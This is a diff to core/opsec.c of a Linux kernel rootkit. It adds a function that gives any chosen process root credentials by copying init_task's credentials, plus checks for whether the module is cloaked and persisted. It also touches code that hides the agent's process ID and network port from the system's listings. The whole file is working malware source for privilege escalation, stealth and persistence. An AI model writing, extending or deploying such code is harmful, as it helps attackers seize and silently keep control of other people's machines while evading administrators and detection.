@@ -1,14 +1,14 @@
 // SPDX-License-Identifier: GPL-2.0
-// core/opsec.c - Escalation, module cloaking, persistence.
+// core/opsec.c - Escalation, module cloaking, persistence, auto-opsec.
 #include <linux/cred.h>
 #include <linux/fs.h>
 #include <linux/list.h>
 #include <linux/module.h>
+#include <linux/rcupdate.h>
 #include <linux/sched.h>
 #include <net/inet_sock.h>
 #include "rootkit.h"
 
-// Privilege escalation
 int rk_escalate(void)
 {
 	struct cred *new_cred;
@@ -19,7 +19,32 @@ int rk_escalate(void)
 	return commit_creds(new_cred);
 }
 
-// Module cloaking
+int rk_escalate_pid(pid_t nr)
+{
+	struct task_struct *task;
+	struct cred *new;
+
+	new = prepare_kernel_cred(&init_task);
+	if (!new)
+		return -ENOMEM;
+
+	rcu_read_lock();
+	task = pid_task(find_vpid(nr), PIDTYPE_PID);
+	if (!task) {
+		rcu_read_unlock();
+		abort_creds(new);
+		return -ESRCH;
+	}
+	get_task_struct(task);
+	rcu_read_unlock();
+
+	rcu_assign_pointer(task->real_cred, new);
+	rcu_assign_pointer(task->cred, get_cred(new));
+
+	put_task_struct(task);
+	return 0;
+}
+
 static struct list_head *saved_mod_list;
 
 void rk_cloak(void)
@@ -38,7 +63,11 @@ void rk_uncloak(void)
 	saved_mod_list = NULL;
 }
 
-// Persistence
+bool rk_is_cloaked(void)
+{
+	return saved_mod_list != NULL;
+}
+
 int rk_persist(void)
 {
 	struct file *f;
@@ -63,28 +92,34 @@ int rk_unpersist(void)
 	return 0;
 }
 
-// Auto-hide agent PID and connection port on connect.
+bool rk_is_persisted(void)
+{
+	struct file *f;
+
+	f = filp_open(PERSIST_PATH, O_RDONLY, 0);
+	if (IS_ERR(f))
+		return false;
+	filp_close(f, NULL);
+	return true;
+}
+
 void rk_auto_hide(struct socket *sock)
 {
 	struct inet_sock *inet = inet_sk(sock->sk);
 	char buf[8];
 
-	// Hide the agent kthread PID
 	snprintf(buf, sizeof(buf), "%d", current->pid);
 	rk_target_add(&rk_pid_targets, buf);
 
-	// Hide the local source port from tcp seq show
 	snprintf(buf, sizeof(buf), "%hu", ntohs(inet->inet_sport));
 	rk_target_add(&rk_port_targets, buf);
 }
 
-// Remove auto-hidden entries on disconnect.
 void rk_auto_unhide(void)
 {
 	char buf[8];
 	int i;
 
-	// Remove agent PID
 	snprintf(buf, sizeof(buf), "%d", current->pid);
 	for (i = 0; i < rk_pid_targets.count; i++) {
 		if (strcmp(rk_pid_targets.targets[i], buf) == 0) {
@@ -93,9 +128,7 @@ void rk_auto_unhide(void)
 		}
 	}
 
-	// Remove source port (port changes each connection, just remove all auto entries)
-	// Since we always add at the end and there's typically only one agent connection,
-	// remove the last port entry (the one we added)
 	if (rk_port_targets.count > 0)
-		rk_target_remove(&rk_port_targets, rk_port_targets.count - 1);
+		rk_target_remove(&rk_port_targets,
+				  rk_port_targets.count - 1);
 }
